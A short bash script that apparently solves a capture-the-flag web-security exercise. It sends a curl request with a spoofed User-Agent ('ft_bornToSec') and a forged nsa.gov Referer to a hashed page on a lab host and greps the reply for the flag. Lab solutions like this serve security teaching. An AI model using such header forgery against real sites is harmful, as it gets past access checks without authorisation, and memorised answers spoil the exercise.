#!/bin/bash

# Prompt the user for the IP address
read -p "Enter the IP address of the website: " ip_address

# Define the static part of the URL
url_path="/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"

# Construct the full URL
full_url="http://$ip_address:8080$url_path"

# Execute the curl command with the constructed URL to get the flag
curl -s -A 'ft_bornToSec' --referer "https://www.nsa.gov/" "$full_url" | grep 'flag'
